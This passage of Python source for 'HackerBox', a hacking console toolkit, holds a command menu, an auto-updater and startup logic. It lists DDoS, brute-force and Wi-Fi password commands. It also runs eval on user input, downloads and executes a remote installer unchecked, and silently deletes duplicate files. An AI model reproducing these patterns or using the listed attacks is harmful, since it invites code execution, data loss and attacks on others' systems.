                          "for cloning git repositories")
            table.add_row("nocolor",
                          "clears the color sets to default")
            table.add_row("tasks.show",          "Show all running tasks")
            table.add_row("tasks.kill",          "Kills the specified task")

            console = Console()
            console.print(table)

        # Show ip address of this Machine
        elif z == "root.showip":
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            print("The ip address of this machine is "+s.getsockname()[0])
            s.close()
        elif z == "calc":
            print(
                "Use [*] for Multiplication, [+] for Sum , [/] for Divivde , [-] for Sutract Eg : 23 + 12")
            calcin = input("Caculate : ")
            print(eval(calcin))
        # Show website ip addresses
        elif z == "net/showwebip":
            try:
                import socket as s
                host = input("Enter web URL:")
                ip = s.gethostbyname(host)
                print('The IP Address of ' + host + ' is: ' + ip)
            except s.gaierror:
                s.gaierror == print(f"{host} <-- Host Not Found!")

        # Wifi nearby:
        elif z == "wifi/nby":
            import subprocess
            devices = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'network'])
            devices = devices.decode('ascii')
            devices = devices.replace("\r", "")
            print(devices)
            notification_c(f"The wifi devices are found!")
        # if users input is null or nothing.
        elif z == "":
            pass
        elif z == KeyboardInterrupt:
            quitdialogue = input("Do you want to quit? y or n : ")
            if quitdialogue == "y":
                import os
                os._exit(0)
        # Help Commands:
        elif z == "help" or z == "?":
            from rich.console import Console
            from rich.table import Table
            table = Table(title="Basic Commands", style="bold")
            table.add_column("Commands", style="cyan")
            table.add_column("Command Info", style="magenta")

            table.add_row("whoami", "to see about the user")
            table.add_row("create.file", "to Create a new file")
            table.add_row("del.file", "to delete a file")
            table.add_row("rename.file", "to rename a file")
            table.add_row("open.file", "to open files")
            table.add_row("calc", "Calculator - Basic + Advance")
            table.add_row("update.file", "to update the file")
            table.add_row("exit", "to exit the console")
            table.add_row("cls or clear", "to clear Console")
            table.add_row("pkg.download", "to download files from internet")
            table.add_row("pkg.youtube", "to download videos from youtube")
            table.add_row("pkg.youtube.mp3", "to download audio from youtube")
            table.add_row("showall/?", "to show all commands")
            table.add_row("show.toolkits", "to show all toolkits")
            table.add_row("shutdown/?", "to show shutdown commands")
            table.add_row("update.info", "to the info of the latest update")

            console = Console()
            console.print(table)
        # If user will input a  wrong command:
        else:
            print("Command not found! If you need Help use 'help' or '?'")
            return z
    except KeyboardInterrupt:
        user_input = input("Do you want to exit the console? y or n : ")
        if user_input == "y":
            import os
            os._exit(0)
        pass
    except Exception as e :
        stm = Settings_Manager()
        stm.reader()
        if stm.Show_error_logs == "True":
            print(e)
        elif stm.Show_error_logs == "False":
            pass
        else:
            print(f"{Fore.RED}Error in Settings file found! -> Use settings.reset command to reset Settings file.")
            print(Fore.RESET)
            pass
    
def HackerBoxupdate():
    from time import sleep
    import requests
    from bs4 import BeautifulSoup

    Program_Ver = "1w.0e"

    def updateCheck():
        versionReturn()
        print("Checking version info...")
        sleep(1)
        coderp = {
            'w': ' ',
            'e': ' ',
            's': ' ',
        }
        pr_ver_replace = Program_Ver.translate(str.maketrans(coderp))
        ver_rem_strip = pr_ver_replace.replace(' ', '')
        web_ver_replace = version_check.translate(str.maketrans(coderp))
        web_rem_strip = web_ver_replace.replace(' ', '')
        print(f"The Latest version is : {web_rem_strip}")
        sleep(0.5)
        print(f"Program version is    : {ver_rem_strip}")
        sleep(1)
        review_url = "https://pastebin.com/raw/kU4sqcN5"
        resp = requests.get(review_url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        old_ver_check = soup.text
        if Program_Ver in old_ver_check:
            print("No Updates found! -> Latest Version")
        else:
            print("The version is not latest!")
            oldVersionCheckdownload()

    def versionReturn():
        review_url = "https://pastebin.com/raw/kU4sqcN5"
        resp = requests.get(review_url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        global version_check
        version_check = soup.text
        return version_check

    def newVerDetect():
        versionReturn()
        coderp = {
            'w': ' ',
            'e': ' ',
            's': ' ',
        }
        web_ver_replace = version_check.translate(str.maketrans(coderp))
        global web_rem_strip2
        web_rem_strip2 = web_ver_replace.replace(' ', '')
        return web_rem_strip2

    def oldVersionCheckdownload():
        newVerDetect()
        import wget
        import shutil
        import os
        import zipfile
        review_url = "https://pastebin.com/raw/u8ttUEs5"
        versionReturn()
        resp = requests.get(review_url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        old_ver_check = soup.text
        if Program_Ver in old_ver_check:
            print(f"New Update is Found -> {web_rem_strip2}")
            notification_c(f"The new update is Found -> {web_rem_strip2} ")
            ask_to_update = input("Do you want to update? (Y/N): ")
            if ask_to_update == "Y" or ask_to_update == "y":
                wget.download(
                    "https://allpetsworld.000webhostapp.com/HackerBox/")
                print("\n")
                print(f"Creating a New Directory named HackerBoxDownload...\n")
                sleep(1)
                os.mkdir("HackerBoxDownload")
                sleep(2)
                print("Extracting the Downloaded files...\n")
                current_dir = os.getcwd()
                current_dir23 = current_dir+"\\HackerBox.zip"
                ext_loc = current_dir + "\\HackerBoxDownload"
                with zipfile.ZipFile(current_dir23, 'r') as zip_ref:
                    zip_ref.extractall(ext_loc)
                sleep(1)
                print("Extraction Successful\n")
                sleep(1)
                print("Running the Setup File...\n")
                sleep(1)
                try:
                    os.startfile(
                        current_dir+"\\HackerBoxDownload\\AutoInstall.bat")
                    exit()
                except:
                    try:
                        os.startfile(
                            current_dir+"\\HackerBoxDownload\\HackerBox.exe")
                        sleep(10)
                    except OSError as e:
                        print("Opertation cancelled\n")
                ask_to_delete = input(
                    "Do you want to delete the downloaded files? (Y/N): ")
                if ask_to_delete == "Y":
                    shutil.rmtree("HackerBoxDownload")
                    try:
                        os.remove("HackerBox.zip")
                    except:
                        print("Deletion Successful\n")
                        sleep(2)
                else:
                    print("Deletion Cancelled\n")

            else:
                print(
                    f"OK -- Skipped Update {web_rem_strip2} | -> use 'update.HackerBox' to Update to Latest Version\n")

    updateCheck()
import configparser
config = configparser.ConfigParser()
class Settings_Manager():
 def writter(self):
    config['DEFAULT'] = {'File-Type': 'Settings',
                     'Name': 'HackerBox',
                     'Description' : 'Settings File for HackerBox - Editable.',
    				 'Warning' : 'Only Change this if you know what are you doing!'}
    config['Main Settings'] = {
    	'Auto-Update' : 'True',
    	'Ask-For-Administrator' : 'True',
        'Show-Disclaimer' : 'True',
        'Auto-File-Sort' : 'True',

    }
    config['Commands Configuration'] = {
        'Custom-Package-Download-Directory' : 'Default',
        'GitHub-Clone-Directory' : 'nil'
    }
    config['Youtube Settings'] = {
        'Videos-Output-Directory' : '.',
        'Audio-Output-Directory' : '.'
    }
    config['Commandline Settings'] = {
        'Prompt-autocomplete' : 'True',
        'Show-Errors-log' : 'False'
    }

    with open('Settings.ini', 'w') as configfile:
        config.write(configfile)
 def reader(self):
     dir1 = [f for f in os.listdir('.')]
     if "Settings.ini" in dir1:
        config.read('Settings.ini')
     elif "Settings.ini" not in dir1:
          ask_for_s = input(f"{Fore.RED}Settings File Not Found! Do you want to Reset Settings [y/n] :")
          if ask_for_s == "y" or ask_for_s =="Y":
              stm.writter()
              config.read("Settings.ini")
              print(Fore.RESET)
          else:
              pass
     else:
         pass
     config.sections()
     # Reading Main Section of Settings file
     self.Auto_update = config['Main Settings']['auto-update']
     self.Ask_for_admin = config['Main Settings']['ask-for-administrator']
     self.Show_disclaimer = config['Main Settings']['Show-Disclaimer']
     self.Auto_file_sort = config['Main Settings']['auto-file-sort']
     self.Auto_update = config['Main Settings']['auto-update']
     # Reading commands configurations 
     self.Package_output = config["Commands Configuration"]['Custom-Package-Download-Directory']
     self.Git_output = config["Commands Configuration"]['GitHub-Clone-Directory']
     # Reading Youtube Settings
     self.Video_output = config["Youtube Settings"]["Videos-Output-Directory"]
     self.Audio_output = config["Youtube Settings"]["Audio-Output-Directory"]
     # Reading Command-Line Settings
     self.Auto_complete = config["Commandline Settings"]["Prompt-autocomplete"]
    #  self.Sleep_break = config["Commandline Settings"]["Sleep-Break"]
     self.Show_error_logs = config["Commandline Settings"]["Show-Errors-log"]
if __name__ == "__main__":
    stm = Settings_Manager()
    stm.reader()
    try:
        print("Analyzing HackerBox's Directory")
        # print(stm.Auto_update)
        try:
            shutil.rmtree("HackerBoxDownload")
        except:
            pass
        try:
            while True:
                try:
                    os.mkdir("My Files")
                    break
                except FileExistsError:
                    break
            if stm.Auto_file_sort == "True":
             while True:
                import os
                dir1 = [f for f in os.listdir('.')]
                ext = (".txt" , ".mp3" , ".mp4")
                tmp = (".part" , ".tmp")
                for f in dir1:
                    if f.endswith(ext):
                        try:
                            shutil.move(f ,"My Files")
                        except:
                            os.remove(f)
                    elif f.endswith(tmp):
                        os.remove(f)
                break
            elif stm.Auto_file_sort == "False":
                pass
            else:
                print(f"{Fore.RED}Error in Settings file found! -> Use settings.reset command to reset Settings file.")
                print(Fore.RESET)
        except Exception as e:
            print(e)
        

        if stm.Ask_for_admin == "True":    
         try:
            import ctypes
            import os

            def isAdmin():
                try:
                    is_admin = (os.getuid() == 0)
                except AttributeError:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return is_admin
            if isAdmin() == False:
                ask_exeit_add = input(
                    "The Program is not in Administrator mode. Do You still want to Continue  [y/n] : ")
                if ask_exeit_add == "y" or ask_exeit_add == "Y":
                    pass
                else:
                    print("OK - Closing Console")
                    quit()

         except:
            pass
        elif stm.Ask_for_admin == "False":
            pass
        else:
            print(f"{Fore.RED}Error in Settings file found! -> Use settings.reset command to reset Settings file.")
            print(Fore.RESET)
        try:
            import hashlib
            import os
            unique = dict()
            for filename in os.listdir('.'):
                if filename == "Hackerbox.exe" or filename == "HackerBox.py":
                    pass
                else:
                    if os.path.isfile(filename):
                        filehash = hashlib.md5(
                            open(filename, 'rb').read()).hexdigest()
                        if filehash not in unique:
                            unique[filehash] = filename
                        else:
                            os.remove(filename)
            try:
                check_Scripts = os.path.isdir("Dics")
                if check_Scripts == True:
                    pass
                else:
                 from prompt_toolkit.shortcuts import yes_no_dialog
                 from time import sleep
                 def installer():
                      import wget
                      import zipfile
                      import os
                      print("Beggining the process of installing Files...\n")
                      wget.download("https://allpetsworld.000webhostapp.com/HackerBox/Dics/Dics.zip")
                      current_dir = os.getcwd()
                      current_dir23 = current_dir+"\\Dics.zip"
                      with zipfile.ZipFile(current_dir23, 'r') as zip_ref:
                               zip_ref.extractall()
                      os.remove("Dics.zip")
                      sleep(1)
                      print("The Downloaded files were : Dics.zip -> Dics")
                      print("The Folder contains Pre-Made Dictionaries Used in Scripts..")     
                      print("The Download went Successfull.")
                 result = yes_no_dialog(
                   title='Required Packages',
                   text="This Program requires some Additional resources to run. Do you want to download them?").run()
                 if result == True:
                     installer()
                 else:
                     result = yes_no_dialog(
                     title='Warning!',
                     text="Are you sure? This could cause Errors in Scripts.").run()
                     if result == True:
                         pass
                     else:
                         installer()
            except:
                pass
        except:
            pass

        sleep(2)
        print("Please be Patient...")
        if stm.Auto_update =="True":
            print("Checking for updates...")
            ProgressBar1("Initializing" ,.04)
            print("\n")
            HackerBoxupdate()
        elif stm.Auto_update=="False":
            pass
        sleep(2)
        print("Clearing the Console...")
        def clear(): return os.system('cls' if os.name == 'nt' else 'clear')
        clear()  # Clears Console
        notification_c("The HackerBox is Runing")
        license3 = f"""{Fore.RED}Hacker Box Copyright (C) 2022  Muhammad Sami
This program comes with ABSOLUTELY NO WARRANTY;
This is free software, and you are welcome to redistribute it
under certain conditions;"""
        if stm.Show_disclaimer =="True":
            for s in license3:
                import sys
                sys.stdout.write(s)
                sys.stdout.flush()
                sleep(0.04)
            sleep(1)
            clear()
        elif stm.Show_disclaimer=="False":
            pass
        else:
            print(f"{Fore.RED} Found Error in Settings.ini File! Consider Rechecking the File! -> Currenly Ignoring")
            pass
        print(Fore.RESET)
        print("HackerBox\n")
        print("Copyright (c) - GPL-3.0 - 2022. All Rights Reserved.\n")
        print("Make sure to Run as Administrator. Active Internet connection is required to run things properly.\n")
    except Exception as e:
        print(e)

    while True:
        from prompt_toolkit import PromptSession
        from prompt_toolkit.completion import WordCompleter
        from prompt_toolkit.lexers import PygmentsLexer
        from prompt_toolkit.styles import Style
        from pygments.lexers.sql import SqlLexer

        sql_completer = WordCompleter(['scanfix', 'hacking.scripts', 'root.showip', 'wifi/nby', 'wlan/show.pass', 'lan.ping',
                                       'lanport/scan.ip', 'check.urlexists', 'net.browse', 'ls', 'ls -a', 'terminal', 'python.run', 'wlan.renew', 'wlan.release', 'net.speedtest', 'ipcon.all', 'win.ver', 'mb.gb', 'gb.mb', 'update.HackerBox',
                                       'git.clone', 'nocolor', 'tasks.show', 'tasks.kill', 'whoami', 'create.file', 'del.file', 'rename.file',
                                       'open.file', 'calc', 'update.file', 'exit', 'cls', 'clear', 'pkg.download', 'pkg.youtube',
                                       'pkg.youtube.mp3', 'showall/?', 'show.toolkits', 'shutdown/?', 'update.info', 'shutdown.s',
                                       'restart.s', 'remote.shutdown', 'logout.s', 'ddos.start', 'host.getip', 'ip.get', 'ip.info', 'wlan/show.pass',
                                       'pass.bruteforce', 'admin.panelfinder','settings.reset', 'xss/webchecker', 'sitetester', '?', 'help', 'dos.start', 'ftp.bruteforce','port.discovery','web.bruteforce'], ignore_case=True)
        style = Style.from_dict({
            'completion-menu.completion': 'bg:#008888 #ffffff',
            'completion-menu.completion.current': 'bg:#00aaaa #000000',
            'scrollbar.background': 'bg:#88aaaa',
            'scrollbar.button': 'bg:#222222',
        })

        session = PromptSession(
            lexer=PygmentsLexer(SqlLexer), completer=sql_completer, style=style)

        try:
            import getpass
            if stm.Auto_complete != "False":
                z = session.prompt(f'{getpass.getuser()} ~$: ').strip()
                c = usercommand(z)
            elif stm.Auto_complete == "False":
                z = input(f'{getpass.getuser()} ~$: ').strip()
                c = usercommand(z)
            else:
                print(f"{Fore.RED}Error in Settings file found! -> Use settings.reset command to reset Settings file.")
                print(Fore.RESET)
        except KeyboardInterrupt:
            continue
        except EOFError:
            break
        except ValueError:
            quit()
